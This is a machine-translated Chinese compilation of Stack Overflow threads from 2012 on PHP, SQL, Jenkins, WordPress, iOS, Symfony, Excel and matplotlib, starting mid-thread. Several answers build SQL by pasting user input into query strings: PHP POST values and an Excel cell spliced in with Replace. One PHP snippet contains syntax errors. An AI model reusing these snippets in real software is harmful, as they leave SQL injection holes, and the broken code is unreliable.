你说如果你有 100 个后变量，你就不想有“100 个 if 语句”。然后，您可以这样做，这将检查您的所有 $_POST 变量。请记住，这不会检查某些输入字段是否为空，这意味着输入值中可以有空格而不返回错误。

```
// Here you set how many results there should be from $_POST (total inputs)
$totalInputs=100;

if(count($_POST) != $totalInputs)
{
    echo "You forgot to fill all fields.";
}
else
{
    // Do your MySQL query here
} 
```

希望对你有帮助！

* * *

### 旧代码

使用以下 PHP 代码段：

```
if(!empty($postEmri) && !empty($postKlienti))
{
     $sql="UPDATE forma SET emri='$postEmri', klienti='$postKlienti', telefoni='$postTelefoni'";
} 
```

PHP 函数 empty() 检查变量是否为空。

更多信息在这里： http: [//php.net/manual/en/function.empty.php](http://php.net/manual/en/function.empty.php)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-11T15:26:27.747

```
$sql='UPDATE forma SET ';
$appendSql = '';
if ( !empty($postEmri) ) $appendSql .= '`emri` = \" . $postEmri. \",';
if ( !empty($postKlienti) ) $appendSql .= '`klienti` = \" . $postKlienti. \",';
etc.

if ( !empty($appendSql)  ) {
    $sql =. $appendSql;
    $sql = substr($sql, 0, -1); 
    // Do query
} else {
    // Nothing to do, since nothing changed.
} 
```

# maven - 詹金斯从不正确的路径执行 Maven

> ID：13822913
> 
> 赞同：14
> 
> 时间：2012-12-11T15:22:37.683
> 
> 标签：maven, jenkins

这两种情况都会发生：maven 项目和 freestyle 项目，当 maven 目标被调用时，它会尝试使用绝对路径执行 mvn。

```
[MY-Job] $ tools/Maven/Jenkins_Private_Maven/bin/mvn -f cc/pom.xml -Ddeploy_env=xxx.dev.prv   -Dbranch=dev -D-Dsmdist.target=/opt/builds -U clean test -DtestGroups=unit,delegate -Do verride:server=xxx.dev.prv
FATAL: command execution failed 
java.io.IOException: Cannot run program "tools/Maven/Jenkins_Private_Maven/bin/mvn" (in    directory "workspace/MY-Job"): java.io.IOException: error=2, No such file or directory 
```

我可以看到 mvn 安装在用户家中：

```
/home/jenkins/tools/Maven/Jenkins_Private_Maven/bin/mvn 
```

但它试图从工作区运行它：

```
/home/jenkins/workspace/MY-Job/tools/Maven/Jenkins_Private_Maven/bin/mvn 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-08-28T06:15:56.627

1.  在（Jenkins -> 配置）下添加默认的maven安装 ![詹金斯 -> 配置 -> Maven](../Images/3e2a4985ac3a8fffbfedcca0a4bc89c8.png)

2.  转到失败的作业并确保从下拉列表中选择默认的 Maven 安装 ![配置失败的作业](../Images/8c48156a3b3df73d9f69ea37a026ac1c.png)

3.  运行作业。成功！

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-12-11T15:51:39.850

你确定你已经在 J​​enkins 中设置了 Maven **->**像这样的配置

![在此处输入图像描述](../Images/a395170909fa3e0e45c5ba044f88cb21.png)

我有预感你`**"."**`在你的 Maven 设置中的某个地方有一个意外的当前目录引用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-03-16T10:55:22.950

这看起来像是 Jenkins 自动安装的 Maven。在这种情况下，以前的答案不正确。

在这种情况下，您似乎没有在辅助设置中为您的从属指定“远程 fs 根”——更高版本的 Jenkins 标志未将其正确设置为错误。

![从属配置屏幕](../Images/0a253da51d23838dc16562566828fbc8.png)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-02-01T15:30:28.097

in Jenkins 2.43:

Manage Jenkins -> Global Tool Configuration -> Maven

[![enter image description here](../Images/551f8d947969ed3c882a3fba087fb05e.png)](https://i.stack.imgur.com/cxOVL.png)

# wordpress - 编辑帖子图像的默认尺寸？

> ID：13822914
> 
> 赞同：0
> 
> 时间：2012-12-11T15:22:38.557
> 
> 标签：wordpress, wordpress-theming

将新照片添加到 wordpress 帖子时，您可以选择图像的大小，如下所示：
![在此处输入图像描述](../Images/d47febc7a573750b4e9ebe986b0b74af.png)

有没有办法编辑这些图像的大小？帖子中图像的最大宽度是 598 像素，那么有没有办法可以为这些中的任何一个指定宽度 598 像素？

有没有办法将所有以前的帖子从“全尺寸”切换到 598 像素的任何尺寸？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T22:56:56.103

您可以在后端设置各种图像大小 - 设置 -> 媒体

在那里您可以设置缩略图、中号和大号。

要在 Wordpress 使用旧设置上传和调整大小后再次重新生成所有图像大小，您可以使用插件[Regenerate Thumbnails](http://wordpress.org/extend/plugins/regenerate-thumbnails/)

不要被插件的名称误导（虽然从 WP 的角度来看它在技术上是正确的，但我会说这是相当误导）。该插件会重新生成所有图像大小，而不仅仅是缩略图大小。当然，它不会重新生成原始的全尺寸版本，只会重新生成您在媒体设置中设置的三种尺寸。

插件作者在这里确认 -> [Regenerate all image sizes](http://wordpress.org/support/topic/plugin-regenerate-thumbnails-resize-all-image-sizes-not-just-thumbnail)

# mysql - 使用条件从 mysql 表中检索某些列名

> ID：13822918
> 
> 赞同：2
> 
> 时间：2012-12-11T15:22:53.077
> 
> 标签：mysql, sql, database

我一直在环顾四周，试图找到一种方法来检索列名（数据类型是布尔值），只有当它是“真”/“1”时。

例如，我有这张表，其中 A、B、C、D、E、F 作为不同的列名，下面是布尔值，

```
A | B | C | D | E | F

1 | 1 | 0 | 0 | 1 | 0 
```

我希望检索的只是具有“真”值的列名。所以，我想要的查询结果应该只是 A、B 和 E。

有没有办法做到这一点？还是完全不可能完成，我应该重新设计我的数据库？

提前致谢， Xyles

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T16:08:51.350

一个查询不能有不同的列数。您可以将列的名称与以下内容连接在一起：

```
select concat_ws(',', (case when A then 'A' else '' end),
                 (case when B then 'B' else '' end),
                 ...
                )
from t 
```

您也可以将它们放在单独的行中，并带有`union`：

```
select t.*, 'A'
from t
where A
union all
select t.*, 'B'
from t
where B
. . . 
```

这会将值放在单独的行上。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T19:10:13.117

我建议您重新考虑您的数据库设计。

可以返回列名，但这不是 SQL 编程的规范模式，查询将比它们需要的要复杂得多。

如果您需要返回的是一个包含逗号分隔值列表的字符串，列表中的每个值都代表一个 TRUE 条件，我建议您考虑 MySQL`SET`数据类型。例如

```
mycol SET('A','B','C','D','E','F') NOT NULL 
```

[http://dev.mysql.com/doc/refman/5.5/en/set.html](http://dev.mysql.com/doc/refman/5.5/en/set.html)

```
INSERT INTO mytable (mycol) VALUES ('A,B,E');

UPDATE mytable SET mycol = 'A,B,E' WHERE ...

SELECT mycol FROM mytable WHERE ... 
```

# java - xml java xslt 标签

> ID：13822919
> 
> 赞同：1
> 
> 时间：2012-12-11T15:22:53.823
> 
> 标签：java, xml, xslt

我有一个java代码片段：

```
public static String echo(String a) {
    System.out.println("HERE I AM:"+a+":");
    return "<xxx>" + a + "</xxx>";
} 
```

由以下 xsl 片段调用：

```
<GOGO>
     <xsl:variable name="test">
        <xsl:copy-of select="responseStatus"/>
     </xsl:variable>
     <xsl:copy-of select="javamap:echo($test)"/>
</GOGO> 
```

出于某种原因，如果将 xml 传递给 java 方法，则会删除所有元素标记。在输出端，如果我尝试返回 xml 标签，< 和 > 将被转换为 & lt; 和>

我的代码片段有什么问题，如何修复它以输出 XML？

编辑（在第一次回复后）让我详细说明问题：

我的系统输出如下： 我在这里：
val1
val2
：

理想情况下，我希望我的系统是： `HERE I AM:<foo>val1</foo><bar>val2</bar>:` 如您所见，xml 标签由于某种原因被删除。

这是我想出的解决方案：

```
public static String echo(Node a) throws Exception {

    StringWriter writer = new StringWriter();
    Transformer transformer = TransformerFactory.newInstance().newTransformer();
    transformer.transform(new DOMSource(a), new StreamResult(writer));
    String xml = writer.toString();
    return xml;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T16:05:39.433

你试过这个吗？

```
<xsl:value-of select="responseStatus" disable-output-escaping="no" /> 
```

# ios - 尝试将视图添加到 UIViewController 的视图时出错

> ID：13822921
> 
> 赞同：0
> 
> 时间：2012-12-11T15:22:56.550
> 
> 标签：ios

我需要对其他人的代码进行一些更新。我正在尝试将自定义视图添加到现有的`UIViewController`. 我的代码是：

```
- (void)viewDidLoad
{
    [super viewDidLoad];
    CGRect viewFrame=CGRectMake(50, 50, 200, 200);
    MyImageView *bView=[[MyImageView alloc] initWithFrame:viewFrame];

    [bView setBackgroundColor:[UIColor redColor]];
    [self.view addSubView:bView];

    // Do any additional setup after loading the view from its nib.
} 
```

我收到以下错误：

![在此处输入图像描述](../Images/a397c706caf5f7be1c35d3c614a0476c.png)

我认为这应该可行。是否可以通过这种方式添加自定义视图？关于如何解决的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:24:28.090

它是

```
[self.view addSubview:bView]; 
```

不是

```
[self.view addSubView:bView]; 
```

（addSubview 中没有大写的 V）。

# php - 在 goddady 上部署 owncloud 会给出警告和解析错误

> ID：13822923
> 
> 赞同：1
> 
> 时间：2012-12-11T15:23:04.947
> 
> 标签：php, owncloud

在 godaddy 服务器上部署 owncloud 时出现错误

```
Warning: Unexpected character in input: '\' (ASCII=92) state=1 in /home/content/73/8989273/html/files/lib/app.php on line 611

Parse error: syntax error, unexpected T_STRING in /home/content/73/8989273/html/files/lib/app.php on line 611 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-25T17:36:33.217

这个问题已经过时了，但是其他人可能仍然会出现基本问题。因此，我认为对此给出一般性答案是有意义的：

owncloud 需要 php 版本 5.3 或更高版本。那个版本引入`namespaces`了，命名系统声称是语法错误的反斜杠字符就是这样的命名空间表示法。因此，命名服务很可能只是运行过时的 php 版本（某些版本早于 5.3）。无论如何，此类版本都会贬值，强烈建议服务提供商升级，因为旧版本不安全且不再受支持。

# c# - DataGridView 的自定义组合框列

> ID：13822925
> 
> 赞同：1
> 
> 时间：2012-12-11T15:23:19.830
> 
> 标签：c#, winforms, combobox, datagridcomboboxcolumn

我们有一个自定义组合框，用于显示一些形状而不是文本的表单。为此，我所要做的就是重写 OnDrawItem 函数，它会显示我们想要的内容。这是一个片段供参考：

```
protected override void OnDrawItem(DrawItemEventArgs e)
{
    base.OnDrawItem(e);

    e.DrawBackground();
    if (e.Index >= 0)
    {
        Brush brush = new SolidBrush(Color.LightGray);

        int size = this.Height/2;
        int origenX = e.Bounds.X + 1;
        int origenY = e.Bounds.Y + 3;
        System.Drawing.Drawing2D.GraphicsPath path =
                new System.Drawing.Drawing2D.GraphicsPath();
        switch (e.Index)
        {
            case 0:                            
                e.Graphics.FillRectangle(brush, origenX, origenY, size, size);                            
                Rectangle r = new Rectangle(origenX, origenY, size, size);                            
                ControlPaint.DrawBorder(e.Graphics, r, Color.Black,
                                        ButtonBorderStyle.Solid);
                break;
            case 1:
                path.AddEllipse(origenX, origenY, size, size);
                e.Graphics.FillPath(brush, path);
                e.Graphics.DrawPath(Pens.Black, path);
                break;
        }
    }
} 
```

因此，如果您将其添加到表单并将几个项目添加到您的集合中，您会在下拉菜单中看到一个正方形和一个圆圈。

好的，所以，我现在要做的就是将这个相同的组合框添加到 DataGridView。我知道这个控件有一个 DataGridViewComboBoxColumn。我试图扩展控件，但是，我没有看到要覆盖的这个 OnDrawItem 函数。我想有类似的东西吗？任何帮助，将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T16:31:27.763

您需要将 DataGridViewComboBox 解释为您的自定义组合框。

```
private void dgTest_EditingControlShowing(object sender, DataGridViewEditingControlShowingEventArgs e)
        {
            if (dgTest.CurrentCell.ColumnIndex == 0) // Which column ever is your DataGridComboBoxColumn
            {
                // This line will enable you to use the DataDridViewCOmboBox like your
                // Custom ComboBox.
                CustomComboBox combo = e.Control as CUstomComboBox;

            }
        } 
```

# symfony - 路由“admin/login”不存在错误 Symfony2 + SonataAdminBundle

> ID：13822926
> 
> 赞同：6
> 
> 时间：2012-12-11T15:23:19.650
> 
> 标签：symfony, routing, admin, symfony-sonata, sonata-admin

我按照教程进行设置 `SonataAdmin`，`FosUer`
FosUser 似乎可以连接和断开连接

但是对于奏鸣曲我无法访问
>`my_host/web/app_dev.php/admin/dashboard`
当我尝试将防火墙重定向到：`my_host/web/app_dev.php/admin/login`

并引发错误：
`Route "admin/login" does not exist.
500 Internal Server Error - RouteNotFoundException`

Routing.yml 看起来正确：

```
admin:
     resource: '@SonataAdminBundle/Resources/config/routing/sonata_admin.xml'
     prefix: /admin
_sonata_admin:
     resource: .
     type: sonata_admin
     prefix: /admin
soanata_user:
     resource: '@SonataUserBundle/Resources/config/routing/admin_security.xml'
     prefix: /admin[/xml] 
```

配置.yml：

```
sonata_block:
    default_contexts: [cms]
    blocks:
        sonata.admin.block.admin_list:
            contexts:   [admin]
        sonata.block.service.text:
        sonata.block.service.action:
        sonata.block.service.rss:
sonata_admin:
    title:      Admin Panel
    templates:
        ## default global templates
        layout:  SonataAdminBundle::standard_layout.html.twig
        ajax:    SonataAdminBundle::ajax_layout.html.twig
        ## default actions templates, should extend a global templates
        list:    SonataAdminBundle:CRUD:list.html.twig
        show:    SonataAdminBundle:CRUD:show.html.twig
        edit:    SonataAdminBundle:CRUD:edit.html.twig
fos_user:
    db_driver: orm
    firewall_name: main
    user_class: Application\Sonata\UserBundle\Entity\User 
```

安全性.yml：

```
firewalls:
    admin:
        pattern:      /admin(.*)
        form_login:
            provider:       fos_userbundle
            login_path:     admin/login
            use_forward:    false
            check_path:     admin/login_check
            failure_path:   null
        logout:
            path:           /admin/logout
        anonymous:    true

        # defaut login area for standard users
        main:
            pattern:      .*
            form_login:
                provider:       fos_userbundle
                login_path:     /login
                use_forward:    false
                check_path:     /login_check
                failure_path:   null
            logout:       true
            anonymous:    true

    access_control:
             # URL of FOSUserBundle which need to be available to anonymous users
        - { path: ^/_wdt, role: IS_AUTHENTICATED_ANONYMOUSLY }
        - { path: ^/_profiler, role: IS_AUTHENTICATED_ANONYMOUSLY }
        - { path: ^/login$, role: IS_AUTHENTICATED_ANONYMOUSLY }

        # -> custom access control for the admin area of the URL
        - { path: ^/admin/login$, role: IS_AUTHENTICATED_ANONYMOUSLY }
        - { path: ^/admin/logout$, role: IS_AUTHENTICATED_ANONYMOUSLY }
        - { path: ^/admin/login-check$, role: IS_AUTHENTICATED_ANONYMOUSLY }
        # -> end

        - { path: ^/register, role: IS_AUTHENTICATED_ANONYMOUSLY }
        - { path: ^/resetting, role: IS_AUTHENTICATED_ANONYMOUSLY }

        # Secured part of the site
        # This config requires being logged for the whole site and having the admin role for the admin part.
        # Change these rules to adapt them to your needs
        - { path: ^/admin, role: [ROLE_ADMIN, ROLE_SONATA_ADMIN] }
        - { path: ^/.*, role: IS_AUTHENTICATED_ANONYMOUSLY } 
```

php 应用程序/控制台路由：调试：

```
admin_sonata_user_group_show            ANY      /admin/sonata/user/group/{id}/show
admin_sonata_user_group_export          ANY      /admin/sonata/user/group/export
sonata_user_admin_security_login        ANY      /admin[/xml]/login
sonata_user_admin_security_check        ANY      /admin[/xml]/login_check
sonata_user_admin_security_logout       ANY      /admin[/xml]/logout 
```

如果我`IS_AUTHENTICATED_ANONYMOUSLY` 进入角色：
在行 `- { path: ^/admin, role: [ROLE_ADMIN, ROLE_SONATA_ADMIN] }`
我可以访问`admin/dashboard`，因为我没有重定向到管理员/登录，所以我认为这不是 sonataBundle 的问题。

你有什么想法吗？

非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-07-25T22:15:09.413

您必须在您的内部添加[路由信息](http://sonata-project.org/bundles/user/master/doc/reference/installation.html#integrating-the-bundle-into-the-sonata-admin-bundle)`app/config/routing.yml`

```
sonata_user:
    resource: '@SonataUserBundle/Resources/config/routing/admin_security.xml'
    prefix: /admin 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-18T14:04:53.723

全新安装后我也遇到了这个错误。

要解决它，请修改您的`app/config/routing.yml`并写`prefix: /admin`而不是`prefix: /admin[/xml]`下`soanata_user:.`

# html - 如何将 Google 搜索框添加到我的网站？

> ID：13822927
> 
> 赞同：27
> 
> 时间：2012-12-11T15:19:45.790
> 
> 标签：html, google-search

我正在尝试将 Google 搜索框添加到我自己的网站。我希望它搜索谷歌本身，而不是我的网站。我有一些代码可以用来工作，但不再有用：

```
<form method="get" action="https://www.google.com/search">
<input type="text" name="g" size="31" value="">
</form> 
```

当我尝试进行搜索时，它只是指向 Google 主页。好吧，实际上它指向这里：[https ://www.google.com/webhp](https://www.google.com/webhp)

有没有人有不同的解决方案？我究竟做错了什么？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2013-04-12T08:21:11.310

很抱歉回答一个较旧的问题，但我想澄清最后一个问题。

您对表单使用“get”方法。当您的输入字段的名称为“g”时，它将生成一个如下所示的 URL：

```
https://www.google.com/search?g=[value from input-field] 
```

但是当您使用 google 搜索时，您会注意到以下 URL：

```
https://www.google.nl/search?q=google+search+bar 
```

Google 使用“q”查询字符串变量作为搜索查询。因此，将您的字段从“g”重命名为“q”解决了这个问题。

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2017-03-21T11:39:32.170

这是将 google 站点搜索添加到网站的方法之一：

```
<form action="https://www.google.com/search" class="searchform" method="get" name="searchform" target="_blank">
<input name="sitesearch" type="hidden" value="example.com">
<input autocomplete="on" class="form-control search" name="q" placeholder="Search in example.com" required="required"  type="text">
<button class="button" type="submit">Search</button>
</form>
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T16:02:14.750

想通了，伙计们！对于文本框的名称，您必须使用“q”。我有“g”只是为了我自己的个人喜好。但显然它必须是“q”。

有谁知道为什么？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-03-02T21:11:45.090

无需嵌入！只需简单地将用户发送到 google 并在搜索中添加 var，如下所示：（请记住，代码可能无法在此工作，因此请在浏览器中尝试，如果它不起作用。）希望它有效！

```
<textarea id="Blah"></textarea><button onclick="search()">Search</button>
<script>
function search() {
var Blah = document.getElementById("Blah").value;
location.replace("https://www.google.com/search?q=" + Blah + "");
}
</script> 
```

```
 function search() {
    var Blah = document.getElementById("Blah").value;
    location.replace("https://www.google.com/search?q=" + Blah + "");
    }
```

```
<textarea id="Blah"></textarea><button onclick="search()">Search</button>
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-04-12T12:13:22.797

从 2021 年 3 月 13 日起。我为我的网站制作了这个非常简单的代码[https://neculaifantanaru.com/en/how-can-i-integrate-google-search-box-to-my-website-by-implementing-custom-代码.html](https://neculaifantanaru.com/en/how-can-i-integrate-google-search-box-to-my-website-by-implementing-custom-code.html)

**第一步。**这是搜索框。将此代码复制到 html/php 页面中所需的位置。人们会在这里搜索信息。此表单会将搜索结果发送到另一个名为`search.html`

```
 <form action="https://YOUR-WEBSITE.com/search.html" method="get" id="site-search">
        <fieldset>
            <!-- <label for="search">Search in website</label> -->
            <input type="text" name="q" id="q" value="" />
            <button type="submit" class="btn btn-inverse">search</button>
        </fieldset>
    </form> 
```

**第二步。**创建一个名为 的新 html 页面`search.html`。并在该部分中添加此代码`<head>`，更有可能在之前`</head>`：

```
<script>
  (function() {
    var cx = 'YOUR-NUMBER-CODE';
    var gcse = document.createElement('script'); gcse.type = 'text/javascript'; gcse.async = true;
    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
        '//www.google.com/cse/cse.js?cx=' + cx;
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(gcse, s);
  })();
</script> 
```

您可以从此链接获取您的号码代码 [https://cse.google.com/cse/all](https://cse.google.com/cse/all)（在这里您必须添加新的搜索引擎。此外，按顺序关闭“搜索整个网络”选项仅在您的网站上而不是整个网络上查找结果）

**第三步。**将此代码复制`<body>`到同一页面上的部分中： `search.html`

```
<div class="main-content">
<h1>Search the site</h1><p>If you want to search for our articles on a specific topic, write the search term in the form below.</p>

<gcse:searchbox-only></gcse:searchbox-only>
<gcse:searchresults-only></gcse:searchresults-only>
</div> 
```

**就这样。**

# c# - 在网页上加载图像

> ID：13822934
> 
> 赞同：0
> 
> 时间：2012-12-11T15:23:43.340
> 
> 标签：c#, asp.net, html, image

我试图在`<asp:image>`控件上加载图像。

问题是图像的路径保存在数据库中，并且一些图像名称包含空格。例如“图像名称编号 2.jpg”。

当我为 asp 控件设置 ImageUrl 属性时，可以毫无问题地分配它，但是在 html 中加载时，url 显示如下：

```
"C:\..\..\Image%20name%20number%202.jpg" 
```

因为那些“%20”它找不到图片所以它不会显示。

我能做些什么来解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:28:48.810

该`%20`部分实际上是空格字符。`decodeURI()`您可以通过在 javascript 中传递 URL 来轻松删除它：

```
//fileName = "C:....\Image%20name%20number%202.jpg"
var fileName = decodeURI( fileName );
//fileName = "C:....\Image name number 2.jpg" 
```

您可以在此处阅读更多相关信息：[https ://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/decodeURI](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/decodeURI)

的反面`decodeURI()`是`encodeURI()`：

```
//fileName = "C:....\Image name number 2.jpg"
var fileName = encodeURI( fileName );
//fileName = "C:....\Image%20name%20number%202.jpg" 
```

您可以在此处阅读更多相关信息：[https ://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/encodeURI](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/encodeURI)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:27:33.193

每当字符串表示为 URI 时，`%20`预计将替换 a 。 这些s 不应该给您带来问题，请检查您的路径。`space`
`%20`

有关此查看 URL 编码和解码的更多信息：http: [//msdn.microsoft.com/en-us/library/zttxte6w.aspx](http://msdn.microsoft.com/en-us/library/zttxte6w.aspx) http://msdn.microsoft.com/en-us/library/6196h3wt.aspx

# sql - 带有 JOIN 的 SQL/Excel 查询参数

> ID：13822936
> 
> 赞同：1
> 
> 时间：2012-12-11T15:23:48.933
> 
> 标签：sql, sql-server, excel, parameters

我正在学习如何在 excel 驱动的 SQL 查询中使用参数（实际上我一般还在学习 SQL）。[感谢帮助我构建查询以根据需要修改结果](https://stackoverflow.com/questions/13805341/sql-populating-column-b-where-column-a-has-a-match-elsewhere-in-column-b)的好人，我想更进一步，并在 Excel 中提供一个参数来过滤结果。

这是我的查询：

```
SELECT 
    fun.FUNCTION_ID
    ,COALESCE(fun.parent_function, fun2.function_id) as PARENT_FUNCTION
    ,fun.MODULE_ID
    ,fun.DESCRIPTION
    ,fun.FUNCTION_PURPOSE
    ,fun.PB_OBJECT
    ,sec.GROUP_ID
    ,sec.ACCESS_LEVEL
from 
    MODULE_FUNCTION fun

    LEFT JOIN MODULE_FUNCTION fun2
    ON fun.function_id = fun2.function_id
    AND fun2.function_id IN (SELECT parent_function FROM MODULE_FUNCTION)

    LEFT OUTER JOIN FUNCTION_SECURITY sec
    ON fun.FUNCTION_ID = sec.FUNCTION_ID
    AND sec.GROUP_ID = 'GROUP_NAME' 
```

我需要做的是允许团队中的人员在 Excel 工作表中运行此查询，并在第二个 JOIN 中为“GROUP_NAME”提供他们的组名。不幸的是，我不能使用语法`WHERE (sec.GROUP_ID = ?)`（[在此处找到](https://superuser.com/questions/197453/run-an-sql-query-with-a-parameter-from-excel-2007)），因为我需要从 MODULE_FUNCTION 表中提取所有结果，并且仅在提供的组上存在匹配项时从 FUNCTION_SECURITY 表的右侧插入结果（没有匹配项时保留 null） .

当我尝试在最后使用时，我在 Excel 中`AND (sec.GROUP_ID = ?)`得到一个**“无效的参数编号” 。**从我收集到的“？” 只能与 WHERE 一起使用（并在测试查询中为我找到工作）。

我尝试了很多事情，包括声明@parameter，但无济于事。

我很想尝试[这种技术](https://stackoverflow.com/questions/5434768/how-to-pass-parameters-to-query-in-sql)，但如果可能的话，我想避免使用 VB。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T15:47:04.287

我知道您说过您想避免使用 VB，但对于您想要做的事情来说并不太复杂。

您可以让工作表有一个用于组名称的单元格，然后是一个调用宏的按钮，您可以在其中更改 sql 查询以调整 group_id。

就像是：

```
Dim sql As String

sql = "select ... from ... and sec.GROUP_ID = '?'"
sql = Replace(sql, "?", Worksheets("Analysis").Range("A1").Value)

With ActiveWorkbook.Connections("connection name").OLEDBConnection
    .CommandText = sql
    .Refresh
End With 
```

在哪里：

```
Worksheets("Analysis").Range("A1").Value 
```

是 Group_ID。您可以将其设置为工作簿中任何工作表中的特定单元格。我会在它旁边创建一个按钮，称为“刷新表”或类似的东西。

如果您已经创建了一个链接到数据库的表，那么 Excel 中有一个连接对象。转到“数据”选项卡，然后单击“连接”。将弹出一个新窗口。查找与 SQL 查询匹配的连接。单击该连接并单击“属性”，然后将连接名称更改为简单的名称（通常是基于您连接到的服务器/表的长名称）。将其用于

```
ActiveWorkbook.Connections("connection name") 
```

部分。

链接到工作表上的创建按钮和链接到宏：

[http://office.microsoft.com/en-us/excel-help/add-a-button-and-assign-a-macro-to-it-in-a-worksheet-HP010236676.aspx](http://office.microsoft.com/en-us/excel-help/add-a-button-and-assign-a-macro-to-it-in-a-worksheet-HP010236676.aspx)

# java - java - 同时多个http请求

> ID：13822939
> 
> 赞同：4
> 
> 时间：2012-12-11T15:23:53.557
> 
> 标签：java

有没有更好的方法同时发送数千个 http GET 请求？我的代码一个接一个地发送请求。看过其他答案，但无法弄清楚。谢谢。

```
for (int j=0; j<4; j++) {
    DefaultHttpClient httpclient = new DefaultHttpClient();
    CookieStore cookieStore = httpclient.getCookieStore();
    HttpGet httpget = new HttpGet("");
    try {
        HttpResponse response = httpclient.execute(httpget);
        List<Cookie> cookies = cookieStore.getCookies();
    } catch (Exception e) {}
    httpclient.getConnectionManager().shutdown();
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:26:59.733

您应该创建多个线程，每个线程都应该执行一个 HTTP 请求

以下链接可能会有所帮助

[http://hc.apache.org/httpclient-3.x/threading.html](http://hc.apache.org/httpclient-3.x/threading.html)

# excel - 在excel中计算组中的位置

> ID：13822941
> 
> 赞同：0
> 
> 时间：2012-12-11T15:23:55.540
> 
> 标签：excel, excel-formula, uniqueidentifier

我想使用公式自动设置组在表条目中的位置。

这也可以看作是一个自动增量 ID，它只需要在与其关联的组中是唯一的。

该公式将在 Position 列中生成数字，如下图所示：

![目标](../Images/73d1e0a14faf3f4c7fb8fdd3b66e0b25.png)

有没有办法在不使用 VBA 的情况下做到这一点？谢谢你的帮助

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:30:44.460

在 C 列中添加以下内容并向下拖动：

```
=COUNTIF($A$2:A2, A2) 
```

# matplotlib - matplotlib 补丁绘图中的伪影

> ID：13822950
> 
> 赞同：9
> 
> 时间：2012-12-11T15:24:10.057
> 
> 标签：matplotlib

在 matplotlib 中绘制小​​块对象时，由于显示分辨率而引入了伪影。使用抗锯齿并不能解决问题。

这个问题有解决方案吗？

```
import matplotlib.pyplot as plt
import matplotlib.patches as patches

ax = plt.axes()

for x in range(-10,11):
    for y in range(-10,11):
        rect = patches.Rectangle((x, y), width=0.1, height=0.1, color='k',aa=True)
        ax.add_patch(rect)

plt.xlim([-30, 30])
plt.ylim([-30, 30])
plt.show() 
```

![输出](../Images/62691c3d24f87650607a776462894880.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T13:27:07.600

感谢您整理了一个简单的问题示例 - 它确实使调查变得更加容易！

> 这个问题有解决方案吗？

是的，事实证明有！通过查看您附加的图像，我最初的猜测是发生了一些奇怪的剪辑/捕捉。在排除了抗锯齿的可能性（通过轻弹您提供的开关）后，我唯一的其他测试途径是将“snap”关键字设置为 false（有关 snap 方法的非常有限的文档，请参见[http://matplotlib.org/ api/artist_api.html#matplotlib.artist.Artist.set_snap](http://matplotlib.org/api/artist_api.html#matplotlib.artist.Artist.set_snap)）。

设置快照可以解决问题，您最终会得到预期的结果：

```
import matplotlib.pyplot as plt
import matplotlib.patches as patches

ax = plt.axes()

for x in range(-10,11):
    for y in range(-10,11):
        rect = patches.Rectangle((x, y), width=0.1, height=0.1, 
                                 color='k', snap=False)
        ax.add_patch(rect)

plt.xlim([-30, 30])
plt.ylim([-30, 30])
plt.show() 
```

视觉比较（最好在新窗口中打开图像，因为您的浏览器可能会缩放图像并引入进一步的视觉效果）：

![snap属性比较](../Images/2dfdd81b679eae74d71d4e582d198cf5.png)

我对 mpl 中的 snap 属性以及这是否真的是可取的行为并不是特别了解，所以我将在 mpl-devel 邮件列表上发布一个问题来开启关于这个问题的对话。希望这个答案在此期间对您有所帮助。

# java - Kryonet 和 Slick2D

> ID：13822955
> 
> 赞同：1
> 
> 时间：2012-12-11T15:24:22.193
> 
> 标签：java, networking, network-programming, slick2d, kryonet

[我正在尝试在本教程](http://www.youtube.com/watch?v=nFRPHdN5rEU)的帮助下将 Kryonet 集成到 Slick2D 游戏中。我正在尝试创建一个服务器/客户端基础架构，用户可以在其中创建服务器或加入服务器来玩两人游戏。

本教程建议将整个游戏对象添加为“网络侦听器”，但在我的 Slick2D 游戏中，GameContainer 和 StateBasedGame 仅在整个应用程序中可用。

GameContainer 包装了我的游戏对象，这个游戏对象扩展了 StateBasedGame。我不知道如何集成 KryoNet。

我真的很难找到可以帮助我的信息，所以任何指导都会很棒。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T08:36:01.417

您应该创建一个 GameServer 类和一个 GameClient 类。游戏逻辑进入 GameServer，渲染进入 GameClient。如果您的游戏逻辑与您的渲染代码混合在一起，请查看一些模型视图控制器解释（这是一篇不错的文章：[http](http://www.badlogicgames.com/wordpress/?p=2668) ://www.badlogicgames.com/wordpress/?p=2668 ）。

